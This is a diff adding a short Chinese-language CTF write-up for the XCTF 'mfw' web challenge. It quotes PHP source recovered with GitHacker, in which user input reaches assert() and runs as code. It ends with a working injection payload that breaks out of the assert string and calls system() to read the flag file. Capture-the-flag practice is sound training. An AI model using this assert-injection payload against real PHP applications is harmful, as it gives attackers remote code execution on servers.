@@ -1,0 +1,29 @@
+XCTF WEB mfw
+
+看 WP 解得:
+
+先Githacker 拿出 php code ,
+
+index.php:
+
+<?php
+
+if (isset($_GET['page'])) {
+	$page = $_GET['page'];
+} else {
+	$page = "home";
+}
+
+$file = "templates/" . $page . ".php";
+
+// I heard '..' is dangerous!
+assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
+
+// TODO: Make this look nice
+assert("file_exists('$file')") or die("That file doesn't exist!");
+
+?>
+
+assert()函数会将读入的代码当做PHP代码来执行!!!
+
+payload: ?page=').system("cat templates/flag.php");//
